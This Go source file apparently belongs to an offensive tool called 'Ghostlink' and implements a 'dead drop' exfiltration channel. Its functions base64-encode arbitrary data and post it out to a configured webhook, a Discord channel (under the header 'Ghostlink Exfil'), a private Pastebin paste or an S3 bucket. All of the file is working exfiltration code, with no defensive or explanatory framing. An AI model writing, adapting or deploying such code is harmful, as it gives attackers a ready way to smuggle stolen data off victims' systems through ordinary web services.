package channel

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

type DeadDropType string

const (
	DeadDropWebhook  DeadDropType = "webhook"
	DeadDropDiscord  DeadDropType = "discord"
	DeadDropPastebin DeadDropType = "pastebin"
	DeadDropS3       DeadDropType = "s3"
)

type DeadDropConfig struct {
	Type    DeadDropType
	URL     string
	APIKey  string
	Bucket  string
	Region  string
	MaxSize int
}

type DeadDrop struct {
	cfg    DeadDropConfig
	client *http.Client
}

func NewDeadDrop(cfg DeadDropConfig) *DeadDrop {
	if cfg.MaxSize <= 0 {
		cfg.MaxSize = 1024 * 1024
	}
	return &DeadDrop{
		cfg: cfg,
		client: &http.Client{
			Timeout: 30 * time.Second,
		},
	}
}

func (d *DeadDrop) Send(data []byte, metadata string) error {
	switch d.cfg.Type {
	case DeadDropWebhook:
		return d.sendWebhook(data, metadata)
	case DeadDropDiscord:
		return d.sendDiscord(data, metadata)
	case DeadDropPastebin:
		return d.sendPastebin(data, metadata)
	case DeadDropS3:
		return d.sendS3(data, metadata)
	default:
		return fmt.Errorf("unknown dead drop type: %s", d.cfg.Type)
	}
}

func (d *DeadDrop) Type() DeadDropType { return d.cfg.Type }

func (d *DeadDrop) sendWebhook(data []byte, metadata string) error {
	payload := map[string]interface{}{
		"data":     base64.StdEncoding.EncodeToString(data),
		"metadata": metadata,
		"size":     len(data),
		"time":     time.Now().Unix(),
	}
	body, _ := json.Marshal(payload)
	resp, err := d.client.Post(d.cfg.URL, "application/json", bytes.NewReader(body))
	if err != nil {
		return fmt.Errorf("webhook: %w", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 400 {
		return fmt.Errorf("webhook http %d", resp.StatusCode)
	}
	return nil
}

func (d *DeadDrop) sendDiscord(data []byte, metadata string) error {
	b64 := base64.StdEncoding.EncodeToString(data)
	content := fmt.Sprintf("**Ghostlink Exfil**\n```\nMetadata: %s\nSize: %d bytes\n\n%s\n```", metadata, len(data), b64)

	parts := splitContent(content, 2000)
	for _, part := range parts {
		payload := map[string]string{"content": part}
		body, _ := json.Marshal(payload)
		resp, err := d.client.Post(d.cfg.URL, "application/json", bytes.NewReader(body))
		if err != nil {
			return fmt.Errorf("discord: %w", err)
		}
		defer resp.Body.Close()
		if resp.StatusCode >= 400 {
			return fmt.Errorf("discord http %d", resp.StatusCode)
		}
	}
	return nil
}

func (d *DeadDrop) sendPastebin(data []byte, metadata string) error {
	b64 := base64.StdEncoding.EncodeToString(data)
	payload := fmt.Sprintf("api_dev_key=%s&api_paste_code=%s&api_paste_name=%s&api_paste_private=1&api_option=paste",
		d.cfg.APIKey, b64, metadata)
	resp, err := d.client.Post(d.cfg.URL, "application/x-www-form-urlencoded",
		strings.NewReader(payload))
	if err != nil {
		return fmt.Errorf("pastebin: %w", err)
	}
	defer resp.Body.Close()
	respBody, _ := io.ReadAll(resp.Body)
	if !strings.Contains(string(respBody), "https://pastebin.com/") {
		return fmt.Errorf("pastebin error: %s", string(respBody))
	}
	return nil
}

func (d *DeadDrop) sendS3(data []byte, metadata string) error {
	s3URL := fmt.Sprintf("https://%s.s3.%s.amazonaws.com/%s", d.cfg.Bucket, d.cfg.Region, metadata)
	req, err := http.NewRequest("PUT", s3URL, bytes.NewReader(data))
	if err != nil {
		return fmt.Errorf("s3 request: %w", err)
	}
	req.Header.Set("Content-Type", "application/octet-stream")
	if d.cfg.APIKey != "" {
		parts := strings.SplitN(d.cfg.APIKey, ":", 2)
		if len(parts) == 2 {
			req.SetBasicAuth(parts[0], parts[1])
		}
	}
	resp, err := d.client.Do(req)
	if err != nil {
		return fmt.Errorf("s3: %w", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 400 {
		return fmt.Errorf("s3 http %d", resp.StatusCode)
	}
	return nil
}

func ParseDeadDropType(s string) DeadDropType {
	switch strings.ToLower(s) {
	case "webhook":
		return DeadDropWebhook
	case "discord":
		return DeadDropDiscord
	case "pastebin":
		return DeadDropPastebin
	case "s3":
		return DeadDropS3
	default:
		return DeadDropWebhook
	}
}

func splitContent(content string, chunkSize int) []string {
	if len(content) <= chunkSize {
		return []string{content}
	}
	var chunks []string
	for i := 0; i < len(content); i += chunkSize {
		end := i + chunkSize
		if end > len(content) {
			end = len(content)
		}
		chunks = append(chunks, content[i:end])
	}
	return chunks
}


